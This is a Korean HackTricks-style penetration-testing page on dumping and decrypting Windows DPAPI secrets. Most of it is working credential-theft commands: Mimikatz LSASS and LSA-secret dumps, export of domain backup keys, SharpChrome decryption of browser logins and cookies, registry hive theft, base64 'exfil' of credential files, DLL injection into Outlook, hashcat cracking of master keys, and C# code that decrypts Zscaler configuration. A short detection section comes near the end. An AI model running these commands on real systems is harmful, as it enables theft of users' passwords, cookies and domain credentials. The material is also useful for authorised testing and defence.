# DPAPI - 비밀번호 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란

Data Protection API(DPAPI)는 Windows 운영 체제에서 주로 **비대칭 개인 키를 대칭 암호화**하는 데 사용되며, 사용자 또는 시스템 비밀을 중요한 엔트로피 원천으로 활용합니다. 이 방식을 사용하면 개발자는 사용자의 로그온 비밀에서 파생된 키로 데이터를 암호화할 수 있으며, 시스템 암호화의 경우 시스템의 도메인 인증 비밀을 사용할 수 있습니다. 따라서 개발자가 암호화 키 자체의 보호를 관리할 필요가 없어져 암호화 구현이 간소화됩니다.

DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData`와 `CryptUnprotectData`** 함수를 사용하는 것입니다. 이 함수는 애플리케이션이 현재 로그온한 프로세스의 보안 컨텍스트를 사용해 데이터를 암호화하고 복호화하도록 합니다. 기본적으로 데이터는 암호화한 것과 동일한 사용자 또는 시스템 컨텍스트에서만 복호화할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>

이 함수들은 암호화 및 복호화에 사용되는 선택적 **엔트로피 매개변수**도 받습니다. 선택적 엔트로피로 보호된 데이터를 복호화하려면 동일한 엔트로피 값이 필요합니다.<sup>[[2]](#references)[[6]](#references)</sup>

### 사용자 키 생성

DPAPI는 사용자의 자격 증명에서 사용자별 값을 파생합니다. 이 값은 흔히 **pre-key**라고 불립니다. 정확한 파생 방식은 계정과 운영 체제 버전에 따라 다릅니다. 예를 들어 Impacket은 UTF-16LE 비밀번호의 SHA-1 다이제스트를 기반으로 하는 HMAC-SHA1 방식, 비밀번호의 MD4/NT hash를 기반으로 하는 방식, 그리고 Protected Users를 위한 PBKDF2-SHA256 파생 방식을 시도합니다. 따라서 오프라인 도구는 일반 텍스트 비밀번호나 사용 가능한 NT hash만으로도 필요한 자료를 파생할 수 있는 경우가 많습니다.<sup>[[2]](#references)[[10]](#references)</sup>

공격자가 사용자의 비밀번호 hash를 획득할 수 있다면 다음을 수행할 수 있으므로 특히 중요합니다.

- API에 접속하지 않고도 해당 사용자의 키로 DPAPI 암호화된 데이터를 모두 **복호화**
- 오프라인에서 비밀번호를 **crack**하여 유효한 DPAPI 키를 생성할 수 있는지 시도

DPAPI는 보호된 blob마다 새 master key를 생성하는 대신 사용자별로 하나 이상의 **master key**를 유지합니다. 각 master key에는 **GUID**(Globally Unique Identifier)가 있으며, 암호화된 blob에는 해당 데이터를 보호하는 master key가 기록됩니다.<sup>[[2]](#references)</sup>

master key는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 디렉터리에 저장됩니다. 여기서 `{SID}`는 사용자의 Security Identifier입니다. master-key 파일에는 사용자의 **pre-key**로 보호된 자료와, 도메인 사용자의 경우 **domain backup key**로 보호된 복구 자료가 포함됩니다.<sup>[[2]](#references)</sup>

master key를 암호화하는 데 사용되는 **domain key는 도메인 컨트롤러에 있으며 변경되지 않는다**는 점에 유의하세요. 따라서 공격자가 도메인 컨트롤러에 접근할 수 있다면 domain backup key를 가져와 도메인 내 모든 사용자의 master key를 복호화할 수 있습니다.<sup>[[2]](#references)</sup>

암호화된 blob의 헤더에는 데이터를 암호화하는 데 사용된 **master key의 GUID**가 포함됩니다.

> [!TIP]
> DPAPI 암호화 blob은 **`01 00 00 00`**으로 시작합니다.

master key 찾기:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

사용자의 여러 Master Key는 다음과 같은 형태입니다.

![DPAPI란 무엇인가 - 사용자 키 생성: 사용자의 여러 Master Key는 다음과 같은 형태입니다](<../../images/image (1121).png>)

### Machine/System 키 생성

이 키는 컴퓨터가 데이터를 암호화하는 데 사용됩니다. **DPAPI_SYSTEM LSA secret**을 기반으로 하며, 이는 SYSTEM 사용자만 액세스할 수 있는 특수 키입니다. 이 키는 컴퓨터 수준의 자격 증명이나 시스템 전체의 secret처럼 시스템 자체에서 액세스할 수 있어야 하는 데이터를 암호화하는 데 사용됩니다.<sup>[[2]](#references)</sup>

이 키에는 **도메인 백업이 없으므로** 로컬에서만 액세스할 수 있다는 점에 유의하세요.

- **Mimikatz**는 다음 명령으로 LSA secret을 덤프해 키에 액세스할 수 있습니다: `mimikatz lsadump::secrets`
- secret은 레지스트리에 저장되므로 관리자는 **DACL 권한을 수정해 액세스할 수 있습니다**. 레지스트리 경로는 다음과 같습니다: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- 레지스트리 하이브에서 오프라인으로 추출하는 것도 가능합니다. 예를 들어, 대상 시스템의 관리자로서 하이브를 저장하고 exfiltrate할 수 있습니다.

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

그런 다음 분석용 장비에서 하이브로부터 DPAPI_SYSTEM LSA secret을 복구하고, 이를 사용해 machine-scope DPAPI blob(예: machine-protected 애플리케이션 자격 증명 또는 Wi-Fi 프로필)을 복호화합니다:

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam 관련 DPAPI 예시:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI로 보호되는 데이터

DPAPI로 보호되는 개인 데이터는 다음과 같습니다.

- Windows 자격 증명
- Internet Explorer 및 Google Chrome의 비밀번호와 자동 완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
- 암호화 키를 포함한 공유 폴더, 리소스, 무선 네트워크 및 Windows Vault의 비밀번호
- 원격 데스크톱 연결, .NET Passport의 비밀번호와 다양한 암호화 및 인증 용도의 개인 키
- Credential Manager에서 관리하는 네트워크 비밀번호와 Skype, MSN messenger 등의 애플리케이션에서 CryptProtectData를 사용하는 개인 데이터
- 레지스트리 내부의 암호화된 blob
- ...

시스템에서 보호하는 데이터는 다음과 같습니다.
- Wi-Fi 비밀번호
- ...

예약된 작업의 비밀번호는 별도의 LSA secret 문제입니다. [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type)으로 등록된 작업은 로컬 관리자/SYSTEM 복구를 위한 비밀번호를 저장할 수 있지만, S4U 또는 대화형 토큰 작업은 비밀번호가 저장되었음을 보장하지 않습니다. 작업의 principal 및 logon type은 run-as 이름만 보는 것보다 더 확실한 지표입니다.

### Master key 추출 옵션

- 사용자가 도메인 관리자 권한을 보유한 경우, 도메인 내 모든 사용자의 master key를 복호화하기 위해 **도메인 백업 키**에 접근할 수 있습니다.

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- 로컬 관리자 권한이 있으면 **LSASS 메모리에 액세스**하여 연결된 모든 사용자의 DPAPI 마스터 키와 SYSTEM 키를 추출할 수 있습니다.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- 사용자에게 로컬 관리자 권한이 있으면 **DPAPI_SYSTEM LSA secret**에 접근해 머신 마스터 키를 복호화할 수 있습니다:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- 사용자의 password 또는 NTLM hash를 알고 있다면, **사용자의 master key를 직접 복호화할 수 있습니다**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- 사용자 세션에 있는 경우, **RPC를 사용해 마스터 키를 복호화할 백업 키를 DC에 요청할 수 있습니다**. 로컬 관리자 권한이 있고 사용자가 로그인한 상태라면, 다음과 같이 **사용자의 세션 토큰을 탈취할 수 있습니다**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault 목록 보기

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPI 암호화 데이터에 접근하기

### DPAPI 암호화 데이터 찾기

일반 사용자의 **보호된 파일**은 다음 위치에 있습니다:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로에서 `\Roaming\`을 `\Local\`로 바꾼 경로도 확인합니다.

열거 예시:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)는 파일 시스템, 레지스트리 및 B64 blob에서 DPAPI로 암호화된 blob을 찾을 수 있습니다:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

현재 저장된 로그인 정보/쿠키처럼 DPAPI로 보호된 민감한 데이터를 복호화할 때 같은 저장소의 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)을 사용할 수 있습니다.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron 빠른 레시피 (SharpChrome)

- 현재 사용자로 저장된 로그인 정보/쿠키를 대화형으로 복호화 (사용자 컨텍스트에서 실행하면 Chrome 127+의 app-bound 쿠키도 복호화 가능. 추가 키는 사용자의 Credential Manager에서 가져옵니다):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- 파일만 있는 경우 오프라인 분석을 수행합니다. 먼저 프로필의 "Local State"에서 AES state key를 추출한 다음, 이를 사용해 cookie DB를 복호화합니다:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- DPAPI 도메인 백업 키(PVK)를 보유하고 대상 호스트의 admin 권한이 있을 때 도메인 전체/원격 트리아지:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- 사용자의 DPAPI prekey/credkey(LSASS에서 가져온 값)가 있으면 password cracking을 건너뛰고 프로필 데이터를 바로 복호화할 수 있습니다:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Notes
- 최신 Chrome/Edge 빌드에서는 특정 쿠키를 "App-Bound" encryption으로 저장할 수 있습니다. 추가 app-bound key가 없으면 해당 쿠키를 오프라인에서 복호화할 수 없습니다. 대상 사용자 컨텍스트에서 SharpChrome을 실행하면 해당 키를 자동으로 가져옵니다. 아래에 참조된 Chrome 보안 블로그 게시물을 확인하세요.<sup>[[5]](#references)</sup>

### 액세스 키 및 데이터

- **SharpDPAPI를 사용하여** 현재 세션의 DPAPI 암호화 파일에서 자격 증명을 가져옵니다:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **credentials 정보 가져오기**: encrypted data와 guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **masterkeys에 접근**:

RPC를 사용해 **domain backup key**를 요청하는 사용자의 masterkey를 복호화:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** 도구는 마스터키 복호화를 위해 다음 인수도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오거나, `/password`를 사용해 평문 비밀번호를 지정하거나, `/pvk`로 DPAPI 도메인 개인 키 파일을 지정할 수 있습니다...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **masterkey를 사용해 데이터 복호화**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** 도구는 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화에 다음 인수도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오거나, `/password`를 사용해 평문 비밀번호를 지정하거나, `/pvk`를 사용해 DPAPI 도메인 개인 키 파일을 지정하거나, `/unprotect`를 사용해 현재 사용자 세션을 이용할 수 있음에 유의하세요...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey를 직접 사용 (password 불필요)

LSASS를 덤프할 수 있다면 Mimikatz가 plaintext password를 몰라도 사용자의 masterkeys를 복호화하는 데 사용할 수 있는 로그온별 DPAPI key를 노출하는 경우가 많습니다. 이 값을 tooling에 직접 전달하세요:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **현재 사용자 세션**을 사용해 일부 데이터를 복호화합니다:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py를 사용한 오프라인 복호화

피해 사용자 SID와 비밀번호(또는 NT 해시)가 있으면 Impacket의 dpapi.py를 사용해 DPAPI masterkey와 Credential Manager blob을 완전히 오프라인에서 복호화할 수 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

- 디스크에서 아티팩트 식별:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - 해당 masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 파일 전송 도구가 불안정하면, 호스트에서 파일을 base64로 인코딩하고 출력을 복사합니다:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- 사용자의 SID와 password/hash를 사용해 masterkey를 복호화합니다:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- 복호화된 masterkey를 사용해 credential blob을 복호화합니다:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

이 워크플로는 Windows Credential Manager를 사용하는 앱에 저장된 도메인 자격 증명(관리자 계정 포함, 예: `*_adm`)을 복구하는 경우가 많습니다.

---

### 선택적 엔트로피 처리("Third-party entropy")

일부 애플리케이션은 `CryptProtectData`에 추가 **엔트로피** 값을 전달합니다. 이 값이 없으면 올바른 masterkey를 알고 있더라도 blob을 복호화할 수 없습니다. 따라서 이 방식으로 보호된 자격 증명(예: Microsoft Outlook, 일부 VPN 클라이언트)을 대상으로 할 때는 엔트로피를 확보하는 것이 필수적입니다.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)(2022)는 대상 프로세스 내부의 DPAPI 함수를 후킹하고 전달된 선택적 엔트로피를 투명하게 기록하는 user-mode DLL입니다. `outlook.exe` 또는 `vpnclient.exe`와 같은 프로세스를 대상으로 **DLL-injection** 모드에서 EntropyCapture를 실행하면, 각 엔트로피 버퍼와 호출한 프로세스 및 blob의 대응 관계를 기록한 파일이 출력됩니다. 캡처한 엔트로피는 이후 **SharpDPAPI**(`/entropy:`) 또는 **Mimikatz**(`/entropy:<file>`)에 전달하여 데이터를 복호화할 수 있습니다.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Masterkey 오프라인 크래킹 (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607(2016)부터 **context 3** masterkey 형식을 도입했습니다. `hashcat` v6.2.6(2023년 12월)에는 hash-mode **22100**(DPAPI masterkey v1 context), **22101**(context 1), **22102**(context 3)가 추가되어 masterkey 파일에서 사용자 password를 GPU 가속으로 직접 크래킹할 수 있게 되었습니다. 따라서 공격자는 대상 시스템에 접속하지 않고도 word-list 또는 brute-force 공격을 수행할 수 있습니다.<sup>[[7]](#references)</sup>

`DPAPISnoop`(2024)은 이 과정을 자동화합니다:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

도구는 Credential 및 Vault blob도 파싱하고, 크랙된 키로 복호화한 다음 평문 비밀번호를 내보낼 수 있습니다.<sup>[[8]](#references)</sup>


### 다른 머신의 데이터에 액세스하기

**SharpDPAPI and SharpChrome**에서는 **`/server:HOST`** 옵션을 지정해 원격 머신의 데이터에 액세스할 수 있습니다. 물론 해당 머신에 액세스할 수 있어야 하며, 다음 예시에서는 **도메인 백업 암호화 키를 알고 있다고 가정합니다**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)은 LDAP 디렉터리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 작업을 자동화하는 도구입니다. 그런 다음 스크립트는 모든 컴퓨터의 IP 주소를 확인하고 각 컴퓨터에서 smbclient를 실행해 모든 사용자의 DPAPI blob을 가져온 뒤, 도메인 백업 키로 모두 복호화합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록으로, 알지 못했던 서브넷까지 모두 찾을 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 secret을 자동으로 덤프할 수 있습니다. 2.x 릴리스에는 다음 기능이 도입되었습니다:<sup>[[9]](#references)</sup>

* 수백 대 호스트에서 blob을 병렬로 수집
* **context 3** masterkey 파싱 및 Hashcat 크래킹 자동 통합
* Chrome "App-Bound" 암호화 쿠키 지원(다음 섹션 참조)
* 새 **`--snapshot`** 모드로 엔드포인트를 반복적으로 폴링하고 새로 생성된 blob을 비교

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop)은 masterkey/credential/vault 파일을 파싱해 Hashcat/JtR 형식으로 출력하고, 선택적으로 크래킹을 자동 실행할 수 있는 C# 파서입니다. Windows 11 24H1까지의 머신 및 사용자 masterkey 형식을 완전히 지원합니다.<sup>[[8]](#references)</sup>


## 일반적인 탐지

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 디렉터리의 파일에 대한 접근.
    - 특히 **C$** 또는 **ADMIN$**와 같은 네트워크 공유를 통한 접근.
- **Mimikatz**, **SharpDPAPI** 또는 이와 유사한 도구를 사용해 LSASS 메모리에 접근하거나 masterkey를 덤프하는 행위.
- 이벤트 **4662**: *개체에 대한 작업이 수행됨* – **`BCKUPKEY`** 개체에 대한 접근과 연관 지을 수 있습니다.
- 프로세스가 *SeTrustedCredManAccessPrivilege*(Credential Manager)를 요청할 때 발생하는 이벤트 **4673/4674**.

---
### 2023-2025 취약점 및 생태계 변화

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**(2023년 11월). 네트워크에 접근할 수 있는 공격자는 도메인 구성원이 악성 DPAPI 백업 키를 가져오도록 유도해 사용자 masterkey를 복호화할 수 있습니다. 2023년 11월 누적 업데이트에서 패치되었으므로 관리자는 DC와 워크스테이션에 최신 패치가 모두 적용되었는지 확인해야 합니다.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” 쿠키 암호화**(2024년 7월)는 기존의 DPAPI 전용 보호를 사용자 **Credential Manager**에 저장되는 추가 키로 대체했습니다. 이제 쿠키를 오프라인에서 복호화하려면 DPAPI masterkey와 **GCM-wrapped app-bound key**가 모두 필요합니다. SharpChrome v2.3과 DonPAPI 2.x는 사용자 컨텍스트로 실행할 때 추가 키를 복구할 수 있습니다.<sup>[[5]](#references)</sup>


### 사례 연구: Zscaler Client Connector – SID에서 파생되는 사용자 지정 엔트로피

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 구성 파일(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)을 저장합니다. 각 파일은 **DPAPI (Machine scope)**로 암호화되지만, 공급업체는 디스크에 저장하는 대신 *런타임에 계산되는* **사용자 지정 엔트로피**를 제공합니다.<sup>[[1]](#references)</sup>

엔트로피는 다음 두 요소로 재구성됩니다.

1. `ZSACredentialProvider.dll`에 포함된 하드코딩된 secret.
2. 구성이 속한 Windows 계정의 **SID**.

DLL에 구현된 알고리즘은 다음과 같습니다:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

비밀이 디스크에서 읽을 수 있는 DLL에 포함되어 있으므로, **SYSTEM 권한이 있는 로컬 공격자는 어떤 SID에 대해서든 entropy를 재생성하고 blob을 오프라인에서 복호화할 수 있습니다**:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

복호화하면 모든 **디바이스 상태 검사**와 예상 값이 포함된 전체 JSON 구성이 나옵니다. 이는 클라이언트 측 우회 기법을 시도할 때 매우 유용한 정보입니다.

> 팁: 다른 암호화 아티팩트(`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 엔트로피 없이 DPAPI로 보호됩니다(`16`개의 0 바이트). 따라서 SYSTEM 권한을 얻으면 `ProtectedData.Unprotect`를 사용해 직접 복호화할 수 있습니다.

## References

- [1] [Synacktiv – 제로 트러스트를 신뢰해야 할까요? Zscaler 상태 검사 우회하기](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI 비밀 정보. DPAPI의 보안 분석 및 데이터 복구](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz와 C++를 사용해 DPAPI 암호화 비밀 정보 읽기](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI(Data Protection Application Programming Interface) 스푸핑 취약점](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows에서 Chrome 쿠키의 보안 강화](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI 선택적 엔트로피 간편 추출](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 릴리스 노트](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub 저장소](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI 프로젝트 페이지](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL 악용, KeePassXC Argon2 크래킹, DPAPI 복호화를 통한 DC 관리자 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 사용법 및 옵션](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
